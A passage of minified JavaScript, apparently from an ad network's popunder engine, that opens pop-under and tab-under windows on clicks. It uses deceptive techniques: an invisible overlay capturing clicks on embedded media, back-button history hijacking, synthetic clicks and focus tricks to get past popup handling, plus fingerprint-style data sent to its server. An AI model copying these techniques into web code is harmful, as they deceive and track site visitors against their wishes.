Q=p.PopSettings.ChromePopApproach==p.Enums.chromePopApproach.tabOver,R=(w.chrome||"Chrome"===w.name)&&p.PopSettings.IsPopunder&&p.PopSettings.ChromePopApproach==p.Enums.chromePopApproach.mixed;try{if(!(!p.PopSettings.IsPopunder||!p.ChromePopunder.supported()||!w.chrome&&"Chrome"!==w.name||p.PopSettings.IsTracking||Q||R||void 0!==p.PopSettings.SameTabAdSettings&&(p.PopSettings.SameTabAdSettings.Windows&&"WINDOWS"===G.name.toUpperCase()||p.PopSettings.SameTabAdSettings.OSX&&"MAC OS"===G.name.toUpperCase())&& (!p.PopSettings.SameTabAdSettings.AdblockOnly||p.IsAdblockRequest)&&p.PopSettings.SameTabAdSettings.Chrome)){p.ChromePopunder.init(null,e.PopSettings.ChromePopApproach);return}!p.PopSettings.IsPopunder||p.IsMobile.any(p._Top)||!w.chrome&&"Chrome"!==w.name||p.PopSettings.IsTracking||Q||R||void 0!==p.PopSettings.SameTabAdSettings&&(p.PopSettings.SameTabAdSettings.Windows&&"WINDOWS"!==G.name.toUpperCase()||p.PopSettings.SameTabAdSettings.OSX&&"MAC OS"!==G.name.toUpperCase())&&(!p.PopSettings.SameTabAdSettings.AdblockOnly|| p.IsAdblockRequest)&&p.PopSettings.SameTabAdSettings.Chrome||(p.PopSettings.SameTabAdSettings=p.PopSettings.SameTabAdSettings||{},p.PopSettings.SameTabAdSettings.AdblockOnly=!1,p.PopSettings.SameTabAdSettings.Chrome=!0,p.PopSettings.SameTabAdSettings.Windows=p.PopSettings.SameTabAdSettings.Windows||!0,p.PopSettings.SameTabAdSettings.OSX=p.PopSettings.SameTabAdSettings.OSX||!0,p.PopSettings.SameTabAdSettings.ClickAnywhere=p.PopSettings.SameTabAdSettings.ClickAnywhere||!1)}catch(C){e.ConsoleLog(C)}try{if(p.EdgePopunder.supported(w, G)){p.EdgePopunder.init();return}}catch(C){p.ConsoleLog(C)}var W=function(){var C=p._Top.document.createElement("iframe");C.setAttribute("style","display:none;");p._Top.document.body.appendChild(C);C.src=q};p.BindOnDocmentClick(function(C){function P(){e.OnFastPopLoaded();e.PopRunning=!1;e.IncrementFastPopCap()}function S(y){y.getRespectsSize()?(y.setUrl(q),y.setLocation(U,V),y.setSize(J,L)):y.setUrl(q+"&hosted=true");y.setOnSuccessCallback(function(){e.OnFastPopLoaded();e.PopRunning=!1;e.IncrementFastPopCap()}); y.show(C)}if(!p.PopRunning)if(p.PopRunning=!0,p.PopLoaded||p.IsFastPopCapped())p.PopRunning=!1;else if(p.IsClientSideFiltersPassed(p.PopSettings.ClientSideFilters,p.LogZoneFilter(p.FastPopZone))){try{window.console=window.console||{log:function(y){}},e.ConsoleLog(C)}catch(y){}var D=C.target||C.srcElement;p.EventObject=C;if(p.IsDontTriggerForSelectorMatch(p.PopSettings.PopUnderDontTriggerSelector,D))p.PopRunning=!1;else if(p.PopSettings.PopUnderTriggerOnSelector&&!p.IsTriggerOnSelectorMatch(p.PopSettings.PopUnderTriggerOnSelector, D,p.PopSettings.PopUnderTriggerOnSelectorDepth))p.PopRunning=!1;else if("a"!==D.nodeName.toLowerCase()&&(D=p.GetParentLink(D)),p.PopSettings.RespectTargetBlank&&D.getAttribute&&("_blank"===D.getAttribute("target")||"nofollow"===D.getAttribute("rel")))p.PopRunning=!1;else if(p.IsIgnoreElement(D))p.PopRunning=!1;else if(p.IsMobile.any(p._Top)){if(!("iOS"==G.name&&parseFloat(G.version)<parseFloat("6")||p.IsMobile.Windows(p._Top))){var I=e.UaParser.getUA();if(!(-1<I.indexOf("FBAN/FBIOS")||-1<I.indexOf("FB_IAB/FB4A")|| -1<I.indexOf("FBAV"))){q=p.BasePopunder.buildUrl(q,p.Enums.SelectedPopType.TabUnder);if("function"!==typeof window.InfCustomFPSTAMobileFunc||p.PopSettings.IsTracking){if("a"!==D.nodeName.toLowerCase()||"#"==D.getAttribute("href")||-1!=D.getAttribute("href").indexOf("javascript:")||p.PopSettings.RespectTargetBlank&&("_blank"===D.getAttribute("target")||"nofollow"===D.getAttribute("rel")))return e.PopLoaded=!1,e.PopRunning=!1,!0;I=D.getAttribute("href");e.OnFastPopLoaded();p.IncrementFastPopCap();e.PopRunning= !1;if(p.PopSettings.IsTracking)W();else{var M="inftabwindow_"+Math.floor(1E8*Math.random()+1).toString();if(p.IsMobile.iOS(p._Top)&&p.IsMobile.Opera(p._Top))window.open(q,M),p._Top.document.location=I;else{if("iOS"===G.name&&("Chrome"===w.name||"Mobile Safari"===w.name&&parseFloat(w.version)<parseFloat("8")))window.open(I,M);else if(e.PopSettings.MobileHistory)try{var T=window.open(I,M);try{T.history.replaceState({previous:e._Top.location.href},null,e._Top.location.href)}catch(y){e.ConsoleLog(y)}T.addEventListener("popstate", function(y){T.location=y.state.previous})}catch(y){e.ConsoleLog(y),window.open(I,M)}else window.open(I,M);"Android"==G.name&&D.setAttribute("href",q);e._Top.document.location=q}}void 0!==C.preventDefault&&C.preventDefault();return!1}window.InfCustomFPSTAMobileFunc(C,G,w,D,q)}}}else{I=function(){var y=new e.Client,K="function"===typeof window.InfCustomFPSTAFunc?new e.ExternalSameTab(function(N){window.InfCustomFPSTAFunc(N,D,q)}):new e.SameTab({clickAnywhere:e.PopSettings.SameTabAdSettings.ClickAnywhere}); if(!K.isSupported(y))return e.PopLoaded=!0,e.PopRunning=!0;if(!K.canShow(C))return e.PopLoaded=!1,e.PopRunning=!1,!0;K.setUrl(q+"&hosted=true");K.setOnSuccessCallback(function(){e.OnFastPopLoaded();e.PopRunning=!1;e.IncrementFastPopCap()});K.show(C)};M=function(){var y=new e.TabOver;S(y)};var Y=function(){if("true"===p.PopSettings.UseRemoteMediaHost&&p.IsAdblockRequest){var y=window.open("true"===p.PopSettings.UsePopCustomHost?p.PopSettings.PopCustomHostUrl:document.location.href,B,O);setTimeout(function(){y.location.href= q},p.PopRedirectDelay)}else window.open(q,B,O);e.IncrementFastPopCap();e.OnFastPopLoaded();e.PopRunning=!1},Z=function(){q=p.BasePopunder.buildUrl(q,p.Enums.SelectedPopType.PopUnder);if(w.firefox||"FIREFOX"===w.name.toUpperCase()&&53>w.major){var y=window.open("about:blank");A=y.open(q,B,O);setTimeout(function(){y.focus();y.close()},100)}else A=window.open(q,B,O);A&&(w.firefox&&"FIREFOX"===w.name.toUpperCase()&&53>w.major||v(),P())},aa=function(){q=p.BasePopunder.buildUrl(q,p.Enums.SelectedPopType.PopUnder); setTimeout(function(){window.open(q,B,O)},0);setTimeout(function(){var y=window.open("","_self","");y&&y.focus()},0);setTimeout(P,1)},ba=function(){var y=new e.PopOver;S(y)},da=function(){var y=new p.Client,K=[new p.TabOver,new p.PopOver,new p.SameTab({clickAnywhere:!0}),new p.DelayedPopUnder({waitSecondsToLoadMedia:0,waitForParentToClose:!0,waitForParentToFocus:!0})].filter(function(ca){return ca.isSupported(y)});K=new p.RandomEnumerator(K);for(var N=K.popNext();!N.canShow(C);)if(N=K.popNext(),void 0=== N)return;S(N)};if(p.PopSettings.IsTracking)return W(),e.OnFastPopLoaded(),e.PopRunning=!1,e.IncrementFastPopCap(),!0;p.PopSettings.UseSameTab(w,G,p.IsAdblockRequest)?I():w.opera||"Opera"===w.name?I():p.PopSettings.IsPopunder?w.chrome||"Chrome"==w.name?Q||-1<navigator.userAgent.indexOf("Chrome/33.0.1750.146")?M():R?da():Y():(w.firefox||"Firefox"==w.name)&&65<=w.major?aa():Z():ba()}}else p.PopRunning=!1})}function v(){try{if("Safari"===w.name&&11<=w.major)window.name||(window.name=(new Date).getTime()), A.open("",window.name),window.focus(),document.body.focus();else if(A.blur(),A.opener.window.focus(),window.self.window.focus(),window.focus(),w.firefox||"Firefox"===w.name||w.safari||"Safari"===w.name)F();else if(w.msie||"IE"==w.name)e._Top.document.focus();else if(w.chrome||"Chrome"==w.name||w.opera||"Opera"==w.name){var q=document.createElement("A");q.id="inffake";document.body.appendChild(q);q.webkitRequestFullscreen();var B=document.createEvent("MouseEvents");B.initMouseEvent("click",target? !0:!1,!0,window,0,0,0,0,0,!1,!1,!0,!1,0,null);MgPop.currentBlock.fakeLink.dispatchEvent(B);document.webkitCancelFullScreen();setTimeout(function(){window.getSelection().empty()},250)}}catch(J){e.ConsoleLog(J)}}function F(){var q=window.open("about:blank");q.focus();q.close()}var A=null;f=f||{};var E=(f.name||Math.floor(1E3*Math.random()+1)).toString(),H=e.UaParser,G=H.getOS();H.getDevice();var w=H.getBrowser();if(!(a.PopLoaded||!a.PopSettings.AllowMultiplePopsForTheSamePageView&&a.IsFastPopCapped())&& k(e.PopSettings.RequireToRunOnDomainFilter)&&k(e.PopSettings.ReferrerFilter)&&k(e.PopSettings.KeywordFilter)&&m()&&r()&&t()&&u()&&x()&&n()){var ea=e.GetWindowLeft()+e.GetWindowWidth()/2-512,fa=e.GetWindowTop()+e.GetWindowHeight()/2-384;z(d,E,1024,768,ea,fa)}else a.AbortFastPop=!0})(b+(a.IsAdblockRequest?"/fp.rb?":"/fp.engine?")+"id="+a.Guid+"&rand="+l+"&ver="+this.Version+"&time="+c+"&referrerUrl="+g+"&subId="+(0<this.SubID.length?this.SubID:"")+"&tid="+(0<this.TId.length?this.TId:"")+"&abr="+e.IsAdblockRequest+ "&res="+a.GetScreenWidth()+"x"+a.GetScreenHeight()+"&stdTime="+this.GetStdTimezoneOffset()+"&fpe="+a.GetSupportedVideo()+"&curl="+h+"&kw="+encodeURIComponent(e.GetKeywords()))},OnFastPopLoaded:function(){var a=e;a.PopSettings.AllowMultiplePopsForTheSamePageView||(a.PopLoaded=!0);a.FlashClickInterceptor.deactivate();"function"===typeof InfCustomerPopLoadedCallback&&InfCustomerPopLoadedCallback()},FirstOrNull:function(a,b){for(var c=0;c<a.length;c++)if(b(a[c]))return a[c];return null},Map:function(a, b){for(var c=[],g=0;g<a.length;g++)c.push(b(a[g]));return c},GetOwnEnumerableProperties:function(a){if(Object.keys)return Object.keys(a);var b=[],c;for(c in a)Object.prototype.hasOwnProperty.call(a,c)&&b.push(c);return b},ClientSideFilterHandlers:{JsVariableFilter:function(a,b){function c(k){try{var m=new RegExp(k);return null!=e.FirstOrNull(d,function(n){return null!=n&&m.test(n)})}catch(n){return e.ConsoleLog(n),!1}}function g(k){return null!=e.FirstOrNull(d,function(m){return k===m})}var h=b?function(k, m){b("JsVariableFilter",k,m)}:function(){};if(!a)return h(!0,"Filter passed because no data is available"),!0;var l=e.GetOwnEnumerableProperties(window),d=e.Map(l,function(k){try{if("webkitIndexedDB"===k||"webkitStorageInfo"===k)return null;var m="undefined"===typeof window[k]?"undefined":null===window[k]?"null":"function"===typeof window[k]||"object"===typeof window[k]?"":window[k].toString?"'"+window[k].toString().replace(/'/g,"\\'")+"'":"";return k+"="+m}catch(n){return null}}),f=e.FirstOrNull(a.Items, a.IsRegex?c:g);l=null!=f!==a.Exclusive;f=null==f?"No match found in "+(a.Exclusive?"exclusive":"inclusive")+(a.IsRegex?" regex ":" non-regex ")+" variable list: "+a.Items.join(", "):"Item "+f+" from "+(a.Exclusive?"exclusive":"inclusive")+(a.IsRegex?" regex ":" non-regex ")+" variable list matches one or more page variables";h(l,f);return l}},IsClientSideFiltersPassed:function(a,b){if(!a||0===a.length)return!0;for(var c=0;c<a.length;c++){var g=this.ClientSideFilterHandlers[a[c].Type];if(g&&!1===g(a[c], b))return!1}return!0},FindPublisherSiteFilterLogIndex:function(){for(var a=-1,b=0;b<this.Media.DecisionProfile.Log.Messages.length;b++)if("Checking Filters"==this.Media.DecisionProfile.Log.Messages[b].Message){a=b;break}return a},IsPublisherSiteFrequencyCapPassed:function(a,b,c){var g=0,h;for(h in b)(this.ServerDate-new Date(b[h].D))/1E3<a.CapLengthInSeconds&&g++;b={passed:g<a.Cap};c&&(b.message="User impressions of "+g+" are "+(b.passed?"under":"over")+" publisher site frequency cap: "+a.Cap);return b}, GetStdTimezoneOffset:function(){for(var a=(new Date).getFullYear(),b=null,c=0;12>c;c++){var g=(new Date(a,c,1)).getTimezoneOffset();b=null==b?g:Math.max(b,g)}return-1*b},CreateAdUrl:function(a,b,c){function g(h,l){for(var d in l)l.hasOwnProperty(d)&&(h[d]=l[d]);return h}return this.FetchMediaUrl(g(g({},a),c?c:a.AdItems[0]),b)},FetchMediaUrl:function(a,b){var c=e;return a.RedirectUrlTransform&&(c=new c.UrlTransforms(c,c.Lotame),"function"===typeof c[a.RedirectUrlTransform])?c[a.RedirectUrlTransform](a.RedirectUrl, a,b,null):a.RedirectUrl},IsDontTriggerForSelectorMatch:function(a,b){return this.IsTriggerSelectorMatch(a,b,5)},IsTriggerOnSelectorMatch:function(a,b,c){return this.IsFeatureDisabled("IsTriggerOnSelectorMatch")?!0:this.IsTriggerSelectorMatch(a,b,0<c?c:1)},IsTriggerSelectorMatch:function(a,b,c){if(a){a=e._Top.document.querySelectorAll(a);for(var g=0;g<a.length;g++)for(var h=b,l=0;l<c;l++){if(a[g]===h)return!0;h&&"html"!==h.nodeName.toLowerCase()&&(h=h.parentNode)}}return!1},IsFeatureDisabled:function(a){var b= !1;switch(a){case "IsTriggerOnSelectorMatch":b="undefined"!==typeof InfDisableTriggerOnSelector&&InfDisableTriggerOnSelector}return b},IsFeatureEnabled:function(a){var b=!1;switch(a){case "IsSkipUserEventPropagation":b="undefined"!==typeof InfSkipUserEventPropagation&&InfSkipUserEventPropagation;break;case "IsSkipTriggerClick":b="undefined"!==typeof InfSkipTriggerClick&&InfSkipTriggerClick;break;case "IsLookForContainerAnchorLink":b="undefined"!==typeof InfLookForContainerAnchorLink&&InfLookForContainerAnchorLink}return b}, BindOnDocumentTouch:function(a){var b=e._Top;if(b.document.addEventListener)b.document.addEventListener("touchstart",function(c){try{a(c)}catch(g){e.ConsoleLog(g)}},!1);else try{b.document.attachEvent("touchstart",a)}catch(c){e.ConsoleLog(c)}},BindOnDocmentClick:function(a){var b=e._Top;b.document.addEventListener?b.document.addEventListener("click",function(c){try{e.ClickHandler=a(c)}catch(g){e.ConsoleLog(g)}},!1):b.document.attachEvent("onclick",function(c){try{e.ClickHandler=a(c)}catch(g){e.ConsoleLog(g)}})}, _contentLoaded:!1,_contentLoadedListenersInstalled:!1,_contentLoadedListeners:[],BindOnDOMReady:function(a){if("function"!==typeof a)throw"Listener must be a funciton";var b=e._Top,c=b.document;if(this._contentLoaded)b.setTimeout(function(){a.apply(b)},1);else{this._contentLoadedListeners.push(a);var g=function(){return"complete"===c.readyState||!c.attachEvent&&"interactive"===c.readyState},h=this,l=function(){if(!h._contentLoaded){h._contentLoaded=!0;for(var d=0;d<h._contentLoadedListeners.length;d++)try{h._contentLoadedListeners[d].apply(b)}catch(f){h.ConsoleLog("Error calling DOMReady listener: "+ f)}}};g()?b.setTimeout(l,1):this.readyEventHandlersInstalled||(c.addEventListener?(c.addEventListener("DOMContentLoaded",l,!1),b.addEventListener("load",l,!1)):(c.attachEvent("onreadystatechange",function(){g()&&l()}),b.attachEvent("onload",l)),this._contentLoadedListenersInstalled=!0)}},Enums:{VideoAudioMode:{audio:0,audioOnMouseOver:1,muted:2},TrackingEventType:{adFill:1,adView:2,infinityVolume:3,partnerVolume:4},AdFillCheckStatus:{skipped:1,failed:2,success:3},chromePopApproach:{notification:0, notificationEx:1,tabUnder:2,tabOver:3,doublePop:4,hidden:5,mixed:6},SelectedPopType:{PopUnder:0,PopOver:1,TabUnder:2,TabOver:3},PopUnderDisplayTargetingType:{Standard:1,Tab:2}},Utils:{objectToQueryString:function(a){var b=[],c;for(c in a)a.hasOwnProperty(c)&&b.push(encodeURIComponent(c)+"="+encodeURIComponent(a[c]));return b.join("&")},url:{removeSchema:function(a){for(var b=["http:","https:"],c=0;c<b.length;c++)if(0===a.indexOf(b[c]))return a.substring(b[c].length);return a}},getFrameDocument:function(a){return a.get(0).documentWindow|| a.get(0).contentWindow}},FlashClickInterceptor:{enableDebugBorder:!1,ignoreElementPredicate:null,eventUtil:{addListener:function(a,b,c){a.addEventListener?a.addEventListener(b,c):a.attachEvent("on"+b,c)},removeListener:function(a,b,c){a.removeEventListener?a.removeEventListener(b,c):a.detachEvent("on"+b,c)}},overlay:null,activeObject:null,activePollingInterval:null,handleObjects:!0,handleEmbeds:!0,handleVideo:!0,handleInlineFrames:!0,interceptedObjectContainer:null,hasTriggeredEvent:function(a){if(null== this.overlay)return!1;var b=a.target||a.srcElement;return"string"===typeof a.type&&"click"===a.type.toLowerCase()&&b===this.overlay},activate:function(a,b,c){if(!0!==b){b=(a.chrome||"Chrome"===a.name)&&31<=parseInt(a.major);c=(a.msie||"IE"===a.name)&&8<=parseInt(a.major);var g=a.firefox||"Firefox"===a.name,h=a.opera||"Opera"===a.name;if(b||c||"Edge"===a.name||g||!e.PopSettings.InterceptFlash||"Safari"!==a.name&&!h)this.handleObjects=!g,this.overlay=this._insertOverlay(),this.eventUtil.addListener(this.overlay, "mouseleave",this._onOverlayMouseLeave),this.eventUtil.addListener(document,"mouseover",this._onDocumentMouseEnter)}},deactivate:function(){null!==this.overlay&&(this.eventUtil.removeListener(this.overlay,"mouseleave",this._onOverlayMouseLeave),this.eventUtil.removeListener(document,"mouseover",this._onDocumentMouseEnter),this._closeOverlay(),this.overlay.parentNode.removeChild(this.overlay),this.overlay=null)},_insertOverlay:function(){var a=document.createElement("div");try{a.style.backgroundColor= "rgba(0,0,0,0)"}catch(c){a.style.backgroundColor="white",a.style.filter="alpha(opacity=0)"}!0===this.enableDebugBorder&&(a.style.border="3px solid red");a.style.position="absolute";a.style.zIndex=1E4;a.style.display="none";var b=setInterval(function(){e._Top.document.body&&(clearInterval(b),e._Top.document.body.appendChild(a))},10);return a},_onDocumentMouseEnter:function(a){var b=a.target||a.srcElement,c=e.FlashClickInterceptor,g="object"===b.tagName||"OBJECT"===b.tagName,h="embed"===b.tagName|| "EMBED"===b.tagName,l="iframe"===b.tagName||"IFRAME"===b.tagName;!((c.handleObjects||e.PopSettings.InterceptFlash)&&g||(c.handleEmbeds||e.PopSettings.InterceptFlash)&&h||(c.handleInlineFrames||e.PopSettings.InterceptInlineFrames)&&l)||(g||h)&&e.PopSettings.InterceptFlash&&!e.IsFlashPluginEnabled()||"function"===typeof c.ignoreElementPredicate&&!0===c.ignoreElementPredicate(b)||c._onObjectMouseEnter(a)},_onOverlayMouseLeave:function(a){a=e.FlashClickInterceptor;a.interceptedObjectContainer=null;a._closeOverlay()}, _closeOverlay:function(){this.overlay.style.display="none";this.activeObject=null;null!==this.activePollingInterval&&(clearInterval(this.activePollingInterval),this.activePollingInterval=null)},_onObjectMouseEnter:function(a){var b=e.FlashClickInterceptor;b._closeOverlay();a=a.target||a.srcElement;b.activeObject=a;b.interceptedObjectContainer=a.parentElement;var c=b.overlay;c.style.display="block";b._syncOverlaySizeAndPosition(c,a);var g=b.activeObject.getBoundingClientRect();b.activePollingInterval= setInterval(function(){if(null!==b.activeObject){var h=b.activeObject.getBoundingClientRect();g.left===h.left&&g.top===h.top&&g.bottom===h.bottom&&g.right===h.right||b._syncOverlaySizeAndPosition(b.overlay,b.activeObject)}},200)},_syncOverlaySizeAndPosition:function(a,b){var c=null===a.style.borderWidth||""===a.style.borderWidth?0:2*parseFloat(a.style.borderWidth.replace("px",""));a.style.width!==b.offsetWidth+"px"&&(a.style.width=b.offsetWidth-c+"px");a.style.height!==b.offsetHeight+"px"&&(a.style.height= b.offsetHeight-c+"px");c=b.getBoundingClientRect();var g=a.getBoundingClientRect(),h=g.top-(g.top-c.top)+(void 0!==window.pageYOffset?window.pageYOffset:(document.documentElement||document.body.parentNode||document.body).scrollTop);a.style.left=g.left-(g.left-c.left)+(void 0!==window.pageXOffset?window.pageXOffset:(document.documentElement||document.body.parentNode||document.body).scrollLeft)+"px";a.style.top=h+"px"}},GetExpiration:function(a){var b=new Date;b.setTime((new Date).valueOf()+1E3*a); return b},IsExpired:function(a){return(new Date).valueOf()>=Date.parse(a)},IsCapped:function(a,b,c,g){a=(g=!!g)?this.Storage.GetSessionStorage(a):this.Storage.GetLocalStorage(a);b=g?this.Storage.GetSessionStorage(b):this.Storage.GetLocalStorage(b);return void 0===a||0===a||void 0===b||"Invalid Date"===b||this.IsExpired(b)||isNaN(a)?!1:void 0!==c&&a>=c},IncrementCap:function(a,b,c,g){var h=(g=!!g)?this.Storage.GetSessionStorage(a):this.Storage.GetLocalStorage(a),l=g?this.Storage.GetSessionStorage(b): this.Storage.GetLocalStorage(b);if(void 0===h||0===h||void 0===l||"Invalid Date"===l||this.IsExpired(l)||isNaN(h))h=0,l=this.GetExpiration(c);g?this.Storage.SetSessionStorage(a,++h):this.Storage.SetLocalStorage(a,++h);g?this.Storage.SetSessionStorage(b,l):this.Storage.SetLocalStorage(b,l)},IsFastPopCapped:function(){return this.IsCapped("g36NumFastPops","g36NumFastPopsExpire",this.PopSettings.Cap)},IncrementFastPopCap:function(){this.IncrementCap("g36NumFastPops","g36NumFastPopsExpire",this.PopSettings.CapLength)}, GetKeywords:function(){function a(l){for(var d=[],f=0,k=0;k<l.length;k++){var m=l[k].trim().toLowerCase();if(0>d.indexOf(m)){if(255<f)break;d.push(m);f+=(0<f?1:0>f?-1:0)+m.length}}return d.join(",")}if(this.MetaKeywordOverride&&0<this.MetaKeywordOverride.length){for(var b=document.querySelectorAll(this.MetaKeywordOverride),c=[],g=0;g<b.length;g++){var h=b[g].innerText.split(",");c=c.concat(h)}if(0<c.length)return a(c)}b=this._Top.document.getElementsByTagName("meta");return(b=this.FirstOrNull(b,function(l){var d= l.getAttribute("name");return null!=d&&"keywords"===d.toLowerCase()&&"string"===typeof l.content}))&&b.content?a(b.content.split(",")):""},GetWindowHeight:function(){var a=0;"number"==typeof this._Top.window.innerHeight?a=this._Top.window.innerHeight:this._Top.document.documentElement&&this._Top.document.documentElement.clientHeight?a=this._Top.document.documentElement.clientHeight:this._Top.document.body&&this._Top.document.body.clientHeight&&(a=this._Top.document.body.clientHeight);return a},GetWindowWidth:function(){var a= 0;"number"==typeof this._Top.window.innerWidth?a=this._Top.window.innerWidth:this._Top.document.documentElement&&this._Top.document.documentElement.clientWidth?a=this._Top.document.documentElement.clientWidth:this._Top.document.body&&this._Top.document.body.clientWidth&&(a=this._Top.document.body.clientWidth);return a},GetScreenWidth:function(){return screen.width},GetScreenHeight:function(){return screen.height},GetWindowTop:function(){return void 0!==this._Top.window.screenTop?this._Top.window.screenTop: this._Top.window.screenY},GetWindowLeft:function(){return void 0!==this._Top.window.screenLeft?this._Top.window.screenLeft:this._Top.window.screenX},GetParentLink:function(a){var b=a,c=!1;if("a"!==b.nodeName.toLowerCase()&&null==b.getAttribute("target")&&null==b.getAttribute("rel")&&"html"!=b.nodeName.toLowerCase())for(var g=0;b.parentNode&&4>=g&&"html"!=b.nodeName.toLowerCase();)if(g++,b=b.parentNode,"a"===b.nodeName.toLowerCase()&&""!==b.href){c=!0;break}return c?b:a},IsIgnoreElement:function(a){if(!a)return!1; do{if(a.getAttribute&&"true"===a.getAttribute("data-inf-ignore"))return!0;a=a.parentNode}while(a&&a.getAttribute);return!1},Querystring:{Init:function(){for(var a,b=/\+/g,c=/([^&=]+)=?([^&]*)/g,g=window.location.search.substring(1);a=c.exec(g);)this.Params[decodeURIComponent(a[1].replace(b," "))]=decodeURIComponent(a[2].replace(b," "))},Params:[]},Script:{Items:[],Add:function(a,b){return this.Exists(a)?!1:(this.Items.push({url:a,cache:b,complete:!1}),!0)},Exists:function(a){for(var b=0;b<this.Items.length;b++)if(this.Items[b].url== a)return!0;return!1},Complete:function(a){for(var b=0;b<a.length;b++)if(!a[b].complete)return!1;return!0},Create:function(a,b){var c=document.createElement("script");c.setAttribute("type","text/javascript");if(b)c.src=a;else{var g=Math.floor(89999999*Math.random()+1E7);c.src=-1<a.indexOf("?")?a+"&"+g:a+"?"+g}return c},AppendToDom:function(a,b,c){var g=this,h=document.getElementsByTagName("head")[0];if(void 0!==e.UseAjax&&e.UseAjax)e.AjaxLoad(a[b].url,function(f){var k=document.createElement("script"); k.type="text/javascript";k.innerHTML=f.responseText;f=document.getElementsByTagName("script")[0];f.parentNode.insertBefore(k,f);a[b].complete=!0;g.Complete(a)&&"function"==typeof c&&c()});else{var l=a[b].url;void 0!==e.EncodeUrl&&e.EncodeUrl&&(l="https://"+window.getUri(l));var d=this.Create(l,a[b].cache);d.onload=d.onreadystatechange=function(f){a[b].complete||this.readyState&&"loaded"!=this.readyState&&"complete"!=this.readyState||(a[b].complete=!0,d.onload=d.onreadystatechange=null,g.Complete(a)&& "function"==typeof c&&c())};h.appendChild(d)}},Load:function(a,b,c){if(0===arguments.length||1===arguments.length){var g=this.Items;this.Items=[];for(var h=0;h<g.length;h++)this.AppendToDom(g,h,a)}else this.AppendToDom([{url:a,cache:b,complete:!1}],0,c)}},Storage:{GetLocalStorage:function(a){if(a=this.SupportsLocalStorage()?localStorage[a]:this.GetCookie(a)){var b=a.split("__")[0];if(b==this.GetCookie("ISSH")||"undefined"==b)a=a.split("__")[1]}return a},SetLocalStorage:function(a,b){var c=this.GetCookie("ISSH")+ "__"+b;if(this.SupportsLocalStorage())try{localStorage[a]=c}catch(g){this.FailedLocalStorage=!0}else this.SetCookie(a,c)},DeleteLocalStorage:function(a){if(this.SupportsLocalStorage())try{localStorage.removeItem(a)}catch(b){this.FailedLocalStorage=!0}else this.DeleteCookie(a)},SupportsLocalStorage:function(){try{return sessionStorage.setItem("storageSupport",1),sessionStorage.removeItem("storageSupport"),"localStorage"in window&&null!==window.localStorage}catch(a){return"undefined"!==typeof DOMException&& a.code===DOMException.QUOTA_EXCEEDED_ERR&&0===sessionStorage.length&&(window.console=window.console||{log:function(b){}},e.ConsoleLog("Safari private mode detected")),!1}},GetSessionStorage:function(a){if(a=this.SupportsSessionStorage()?sessionStorage[a]:this.GetCookie(a)){var b=a.split("__")[0];if(b==this.GetCookie("ISSH")||"undefined"==b)a=a.split("__")[1]}return a},SetSessionStorage:function(a,b){var c=this.GetCookie("ISSH")+"__"+b;if(this.SupportsSessionStorage())try{sessionStorage[a]=c}catch(g){this.FailedSessionStorage= !0}else this.SetCookie(a,c)},DeleteSessionStorage:function(a){if(this.SupportsSessionStorage())try{sessionStorage.removeItem(a)}catch(b){this.FailedSessionStorage=!0}else this.DeleteCookie(a)},SupportsSessionStorage:function(){try{return sessionStorage.setItem("storageSupport",1),sessionStorage.removeItem("storageSupport"),"sessionStorage"in window&&null!==window.sessionStorage}catch(a){return"undefined"!==typeof DOMException&&a.code===DOMException.QUOTA_EXCEEDED_ERR&&0===sessionStorage.length&&(window.console= window.console||{log:function(b){}},e.ConsoleLog("Safari private mode detected")),!1}},SetCookie:function(a,b,c){var g=new Date;g.setSeconds(g.getSeconds()+c);b=escape(b)+(null==c?"":"; expires="+g.toUTCString());document.cookie=a+"="+b},GetCookie:function(a){var b,c=document.cookie.split(";");for(b=0;b<c.length;b++){var g=c[b].substr(0,c[b].indexOf("="));var h=c[b].substr(c[b].indexOf("=")+1);g=g.replace(/^\s+|\s+$/g,"");if(g==a)return unescape(h)}},DeleteCookie:function(a){this.GetCookie(a)&&(document.cookie= a+"=;expires=Thu, 01 Jan 1970 00:00:01 GMT")},FailedLocalStorage:!1,FailedSessionStorage:!1},TabHistoryManipulator:function(a,b){var c=(b=!!b)?this.Storage.GetSessionStorage(a):this.Storage.GetLocalStorage(a);if(c)try{this._Top.history.replaceState(null,this._Top.document.title,this._Top.location.href),this._Top.history.pushState(null,this._Top.document.title,this._Top.location.href),this._Top.addEventListener("popstate",function(){e._Top.history.replaceState(null,e._Top.document.title,e._Top.location.href); setTimeout(function(){e._Top.location.replace(c)},0)},!1)}catch(g){}finally{b?this.Storage.DeleteSessionStorage(a):this.Storage.DeleteLocalStorage(a)}},TabHistoryRecorder:function(a,b,c){c?this.Storage.SetSessionStorage(b,a):this.Storage.SetLocalStorage(b,a)},StopEvent:function(a){a.preventDefault&&a.preventDefault();a.stopImmediatePropagation&&a.stopImmediatePropagation();a.stopPropagation&&a.stopPropagation()},IsASInstance:function(){result=!1;var a=e.EmailInfoAddress&&-1!==e.EmailInfoAddress.indexOf("adsupply"), b=e.InfinityHost&&-1===e.InfinityHost.indexOf("trklnks");a&&b&&(result=!0);return result},IsMobile:{Android:function(a){return"Android"===e.UaParser.getOS().name},BlackBerry:function(a){return"BlackBerry"===e.UaParser.getOS().name},iOS:function(a){return"iOS"===e.UaParser.getOS().name},Opera:function(a){return("tablet"===e.UaParser.getDevice().type||"mobile"===e.UaParser.getDevice().type)&&("Opera"===e.UaParser.getBrowser().name||-1<e.UaParser.getResult().ua.indexOf("OPiOS"))},Windows:function(a){return"Windows Phone"=== e.UaParser.getOS().name||"Windows Phone OS"===e.UaParser.getOS().name},any:function(a){return this.Android(a)||this.BlackBerry(a)||this.iOS(a)||this.Opera(a)||this.Windows(a)}},IsTablet:function(){return"tablet"===e.UaParser.getDevice().type},Browser:null,InitBrowser:function(){var a=this;this.current=(new UserAgentParser).getBrowser();this.isSafari=function(){return"Safari"===a.current.name||"Mobile Safari"===a.current.name};this.isChrome=function(){return"Chrome"===a.current.name};this.isOpera= function(){return"Opera"===a.current.name};this.isFirefox=function(){return"Firefox"===a.current.name};this.isIE=function(){return"IE"===a.current.name};this.isWebView=function(){return"Chrome Headless"===a.current.name||"Chrome WebView"===a.current.name||"Facebook"===a.current.name||"GSA"===a.current.name};return a},GetSupportedVideo:function(){var a=0;this.IsHtml5VideoSupported()&&(a|=1);this.IsFlashPluginEnabled()&&(a|=2);return a},IsHtml5VideoSupported:function(){return!!document.createElement("video").canPlayType}, IsFlashPluginEnabled:function(){if(navigator&&navigator.mimeTypes&&"undefined"!=typeof 